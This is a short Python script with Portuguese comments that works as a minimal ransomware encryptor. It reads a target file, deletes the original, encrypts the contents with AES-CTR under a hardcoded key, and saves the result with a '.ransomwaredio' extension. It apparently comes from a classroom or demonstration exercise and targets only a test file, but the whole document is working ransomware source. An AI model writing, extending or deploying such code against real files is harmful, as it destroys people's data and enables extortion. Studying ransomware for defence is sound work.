import os
import pyaes

# Abrir o arquivo alvo

file_name = 'teste.txt'
file = open (file_name, 'rb')
file_data = file.read()
file.close()

# Remover o arquivo original

os.remove(file_name)

# Chave de encriptacao

key = b"dYBK9y1fbsq2f&$8"
aes = pyaes.AESModeOfOperationCTR(key)

#Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado

new_file = file_name + '.ransomwaredio'
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()

